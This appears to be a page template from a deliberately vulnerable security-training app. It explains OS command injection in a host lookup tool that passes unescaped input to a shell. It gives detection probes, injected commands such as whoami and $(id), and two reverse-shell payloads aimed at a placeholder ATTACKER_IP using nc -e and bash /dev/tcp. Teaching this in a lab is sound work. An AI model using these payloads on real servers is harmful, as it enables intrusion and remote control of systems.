{% extends "core/example_page_base.html" %} {% set example_title = "OS Command Injection in Host Lookup Tool" %} {% set example_difficulty = "Hard" %} {% block title %}{{ example_title }} — A03{% endblock %} {% block explanation %}

This tool resolves a hostname by shelling out to the system's getent hosts command, with the hostname concatenated directly into the shell string and shell=True handing the whole thing to /bin/sh. Because the input is unescaped, shell metacharacters — ;, &&, $(...) — let you run entirely different commands.

{% endblock %} {% block detect %}

Try a lookup with a semicolon appended to a harmless hostname, e.g. localhost;echo test. If the output includes the word "test" anywhere, your input reached a real shell — the semicolon terminated the intended getent command and started a second one, which is all it takes to confirm command injection without running anything destructive.

{% endblock %} {% block exploitation %}
  1. Try a normal lookup first, e.g. localhost.
  2. Now try: localhost; whoami
  3. The output includes the result of whoami appended after the lookup — you've executed an arbitrary command on the server, running as whatever user the app container uses.
  4. Command substitution also works: $(id) runs id and substitutes its output directly into the "hostname" being looked up.

A single command's output is a proof-of-concept. A real attacker escalates to a persistent, interactive foothold instead:

  1. Start a listener on your own machine: nc -lvnp 4444
  2. Submit this as the hostname. The trailing & backgrounds the reverse shell inside the injected command — but don't expect the page to return right away: this route reads the child process's stdout/stderr with capture_output=True, which only unblocks once those pipes see EOF, and a backgrounded nc that's still connected to your listener keeps holding those same pipes open. So the request hangs for the full 10 seconds and then shows "(lookup timed out)" — that message is not a failure signal. Your listener will already have caught the shell well before the timeout fires; the HTTP response is just idling on pipes the backgrounded process refuses to close, disconnected from whether the exploit worked:
    localhost; nc -e /bin/sh ATTACKER_IP 4444 &
  3. Your listener now has an interactive shell on the target. If the target doesn't have nc -e compiled in, bash's own /dev/tcp feature works identically with no extra tools required — and hits the same pipe-holding behavior, so again expect "(lookup timed out)" on the page while the shell is already live in your listener:
    localhost; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &

This is a good approximation of what real blind command injection feels like: there's often no clean confirmation in the HTTP response either way, timeouts and generic error pages are common, and the only reliable evidence is out-of-band — your listener catching a connection, a DNS query hitting a domain you control, and so on. Judge success by what arrives at your listener, not by what the vulnerable page shows you.

OS command injection is consistently rated among the most severe web vulnerabilities because a successful exploit doesn't just leak data — it hands the attacker arbitrary code execution on the server itself, at whatever privilege level the app process runs as. In the wild this has been used to install web shells, pivot deeper into internal networks, exfiltrate entire filesystems, and establish persistent backdoors, all starting from a single unsanitized field passed to a shell.
